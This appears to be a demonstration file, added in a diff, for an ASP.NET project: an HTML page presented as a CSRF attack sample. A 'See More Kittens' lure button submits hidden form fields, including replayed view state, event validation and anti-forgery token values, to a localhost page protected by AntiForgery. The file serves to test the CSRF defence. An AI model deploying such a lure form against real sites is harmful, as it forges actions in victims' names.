@@ -1,0 +1,24 @@
+<html lang="en">
+<head>
+    <title>Welcome ASP.NET App</title>
+</head>
+<body>
+<h1>Got Kittens?</h1>
+This is CSRF sample posting attack to the page protected with AntiForgery class.
+    <hr />
+    <form method="post" action="http://localhost:52316/DefaultAF" id="ctl00">
+
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="yHsM6bxnJ4Mxh3cK6FPjBYv5++sx+AiJCGYE2370t/u9tRI72fYivo63yhMAXr+074PvQSV963EM2XDI0teM+J75sH52ICUapv6UgWdbSPq0zw1MFrzYPcyHabyawOE7K+mQt91WNyhv5lsGjXc5IeBOKrpkkwpLJQRKLXSn+/k=" />
+
+<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="0C9FD359" />
+
+<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="epARq17OnSSIZKysdG3A6vEYjLVARiHakaI2Bw5J8oO13oeKnu5O1lMzpi/WyqfLFrWUuZLepLXBRDmnS2+1eG1fenwwaoA4+yZiw1piuS1HxmNecuC6LPjgIAaFpAOtveiGJ4W8M7TwEsArmzRGYA==" />
+        
+    <input name="ctl00$MainContent$TextBox1" type="hidden" id="MainContent_TextBox1" value="CSRF Attack via POST" />
+    <input type="submit" name="ctl00$MainContent$ctl00" value="See More Kittens" />
+
+<input type="hidden" name="__RequestVerificationToken" id="__RequestVerificationToken" value="FG6bdK5cw-88KpikO3RFAH0LIrrM6qhhlT-ZQiADM5Qa5PXFWkNI0UOQEkEiYVLxfmWnq2bOeoMvQarGgYTfT_cvgLFB7FMQ7yFBnyL1gsqC1RqQvPOjafnFMYPMnFks0" />
+
+    </form>
+</body>
+</html>
